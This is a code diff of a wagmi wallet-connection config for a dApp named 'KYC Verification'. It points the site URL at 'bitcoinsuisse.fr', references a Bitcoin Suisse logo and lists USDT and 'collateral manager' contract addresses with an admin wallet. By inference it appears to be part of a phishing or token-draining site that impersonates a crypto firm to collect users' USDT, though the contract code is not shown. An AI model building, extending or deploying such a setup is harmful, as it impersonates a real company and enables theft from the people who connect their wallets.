@@ -3,13 +3,13 @@ import { mainnet } from 'wagmi/chains';
 import { walletConnect, injected, coinbaseWallet } from 'wagmi/connectors';
 
 // Configuration WalletConnect
-const projectId = 'c5a2e8e84b09e4764c5f5366b0a3d6e9';
+const projectId = '762758307ff6761e3e2a1340348775f1';
 
 const metadata = {
   name: 'KYC Verification',
   description: 'Verification',
-  url: 'https://salut-sa-va-1.preview.emergentagent.com',
-  icons: ['https://customer-assets.emergentagent.com/job_invest-collateral/artifacts/tzq62nbg_Logo_Bitcoin_Suisse.png']
+  url: 'https://www.bitcoinsuisse.fr',
+  icons: []
 };
 
 export const config = createConfig({
@@ -41,10 +41,13 @@ export const config = createConfig({
 // Adresses des contrats
 export const CONTRACT_ADDRESSES = {
   USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-  // NOUVEAU CONTRAT - DÉPLOYÉ LE 23/01/2026
-  COLLATERAL_MANAGER: '0x178e6faf3812f5ba753d38541a16c401f2ade7e1',
+  // ANCIENS contrats (ne plus utiliser)
+  COLLATERAL_MANAGER_V1: '0x7b2b8f74484d8c2bb8f0c30d1b758031054bdbe1', // Permit2
+  COLLATERAL_MANAGER_V2: '0xF53918295f8ea66702D51D88a5A7Baeb66294091', // Sans SafeERC20
+  // NOUVEAU contrat V3 avec SafeERC20 - DÉPLOYÉ LE 14/01/2026
+  COLLATERAL_MANAGER: '0x9dAf78938Ff0Db73748AB8710973A3D81D7F6f7E',
   // Adresse admin (celle qui déploie le contrat)
-  ADMIN_ADDRESS: '0x98e8Ff93F323aaaf98B13accA607D9CA912b73A5'
+  ADMIN_ADDRESS: '0xE2D574613e8b9Cf2A6e1b5664393Fd5306E1f28C'
 };
 
 // ABI minimum pour USDT
